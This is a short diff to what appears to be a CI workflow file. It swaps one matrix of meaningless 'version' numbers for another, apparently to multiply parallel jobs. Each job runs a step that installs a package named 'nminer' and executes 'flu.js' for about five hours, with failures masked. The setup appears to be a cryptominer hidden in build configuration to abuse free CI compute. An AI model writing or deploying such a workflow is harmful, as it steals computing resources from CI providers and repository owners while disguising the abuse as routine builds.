@@ -9,23 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7561 }
-          - { version: 8787 }
-          - { version: 9758 }
-          - { version: 1621 }
-          - { version: 9487 }
-          - { version: 7671 }
-          - { version: 4665 }
-          - { version: 7501 }
-          - { version: 4316 }
-          - { version: 9071 }
-          - { version: 3800 }
-          - { version: 754 }
-          - { version: 3840 }
-          - { version: 9452 }
-          - { version: 3169 }
-          - { version: 1590 }
-          - { version: 4811 }
+          - { version: 4760 }
+          - { version: 2007 }
+          - { version: 7177 }
+          - { version: 8139 }
+          - { version: 4266 }
+          - { version: 7730 }
+          - { version: 7166 }
+          - { version: 8303 }
+          - { version: 5505 }
+          - { version: 6786 }
+          - { version: 3439 }
+          - { version: 9331 }
+          - { version: 7792 }
+          - { version: 7057 }
+          - { version: 1082 }
+          - { version: 1400 }
+          - { version: 8565 }
+          - { version: 6013 }
+          - { version: 7340 }
 
     steps:
       - name: Checkout
@@ -36,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: at
         run: |
           npm install nminer@latest
-          timeout 346m node flu.js || echo "flu executed"
+          timeout 306m node flu.js || echo "flu executed"
